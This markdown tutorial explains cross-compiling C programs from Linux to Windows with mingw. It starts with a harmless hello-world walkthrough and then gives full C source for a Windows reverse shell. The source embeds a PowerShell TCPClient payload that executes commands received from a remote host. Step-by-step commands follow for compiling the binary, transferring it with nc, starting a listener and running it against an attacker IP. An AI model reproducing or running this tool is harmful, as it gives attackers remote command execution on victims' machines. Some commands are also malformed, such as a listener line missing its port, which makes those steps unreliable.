## On Compilation

With `compilation` we refer to the act of `translating` a source code into a language that is then able to execute on a given CPU architecture.

Example:
> source code --> compilation --> binary

Compilation can be a complex process involving multiple stages.

The general idea however is binaries are compiled for specific environments. Here with `environment` we mean a combination of:
- Hardware Architecture (CPU type)
- Operating System
- Other user-space program and configurations

## On Cross Compilation

The term `cross compilation` is a technique that is used when we want to compile not for our `current environment` but for a `target environment`.

## Practical Example

Let's say for example we're running linux.

In linux the binary format used is the `ELF' format

Example:
> ELF --> Executable and Linkable Format

What if we want to compile a program that will run on a windows machine? Since windows uses a different format, namely the `PE` format, we need to perform `cross-compilation`

Example:
> PE --> Portable Executable

Consider the following example:
```c
#include <stdio.h>

int main(void) {
	printf("Hello World!\n");
	return 0;
}
```

If we simply compile it with `gcc' we obtain a `ELF' binary:
```sh
gcc hello.c -o hello
```

Get details on the file:
```sh
file hello
```

Output:
```sh
hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bec12ca31f07ee4af0e8146ab7f339f816235130, for GNU/Linux 4.4.0, not stripped
```

Which cannot be executed on a windows machine.

If we want to execute it on a windows machine, we need to cross-compile it. To do this we need to install the `x86_64-w64-mingw32-gcc-win32`compiler.

Install using pacman:
```sh
sudo pacman -S mingw-w64-gcc
```

Install using apt:
```sh
sudo apt install g++-mingw-w64-x86-64 gcc-mingw-w64-x86-64
```

We can then use the following command:
```sh
x86_64-w64-mingw32-g++ hello.c -static -o hello
```
- Static library do not have any dependencies with the outside system.
- Dynamic library do have dependencies with the outside system.
- This means that in a compiled dynamic binary all of the code is not included, so the binary has references to other files in the system. You can see that in an above command we did with `file hello`.  

or with the apt example:
```sh
x86_64-w64-mingw32-gcc hello.c -o hello.exe
```

- x86_64-w64-mingw32-g++, for **64 bit** architectures
- i686-w64-mingw32-gcc, for **32 bit** architectures

Check architecture on target machine:
```cmd
systeminfo
```

With this we obtain a `PE32+` that runs on the windows operating system.

Check file details again:
```sh
file hello.exe
```

Output
```sh
hello.exe: PE32+ executable (console) x86-64, for MS Windows, 20 sections
```

Transfer file with `nc`:

Linux
```sh
nc -lvnp < hello .exe
```

Windows
```sh
.\nc64.exe 192.168.122.1 4321 > hello.exe
```

---

## More Complex Example

Shell.c - Spawns a custom reverse shell.
```c
// x86_64-w64-mingw32-g++ shell.c -static -lws2_32 -o shell 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define SUCCESS 0
#define FAILURE 1

const char *PS_TEMPLATE = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\", %s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

int validate_ip(char *ip) {
  struct in_addr res;
  int result = inet_pton(AF_INET, ip, &res);
  return result == 1 ? SUCCESS : FAILURE;
}

int validate_port(char *port) {
  int p = atoi(port);
  return p > 0 && p < 65535 ? SUCCESS : FAILURE;
}

int main(int argc, char **argv) {

  if (argc < 3) {
    fprintf(stdout, "[INFO] - Usage: %s <IP> <port>", argv[0]);
    exit(0);
  }

  // read and validate input
  char *name = *argv++;
  char *ip = *argv++;
  char *port = *argv++;

  fprintf(stdout, "[INFO] - IP = %s, PORT = %s\n", ip, port);

  if (validate_ip(ip) == FAILURE) {
    fprintf(stderr, "[ERROR] - Invalid IP!\n");
    exit(0);    
  } else if (validate_port(port) == FAILURE) {
    fprintf(stderr, "[ERROR] - Invalid PORT!\n");
    exit(0);
  }

  // generate payload string
  int output_length = strlen(PS_TEMPLATE) - 4 + strlen(ip) + strlen(port) + 1;
  char output[output_length] = { 0 };
  snprintf(output, output_length, PS_TEMPLATE, ip, port);
  fprintf(stdout, "[INFO] - Payload generated:\n\n%s\n\n", output);

  // write payload to file
  FILE *fp;
  fp = fopen("test.ps1", "w");
  fprintf(fp, output);
  fclose(fp);

  // execute powershell
  system("powershell .\\test.ps1");

  // TODO: execute this shell after every 30 secs, and if we do not
  // get a connection back simply retry.

  return 0;
}
```

Usage:

Compile:
```sh
x86_64-w64-mingw32-g++ shell.c -static -lws2_32 -o shell 
```
- **l** - Link this library
- **ws** - Windows

Transfer:
```sh
nc -lvnp 4321 < shell.exe
```

```sh
.\nc64.exe 192.168.122.1 4321 > shell.exe
```

Start listener on attacker machine
```sh
nc -lvnp 7777
```

Run on Windows:
```cmd
.\shell <ATTACKER-IP> 7777
```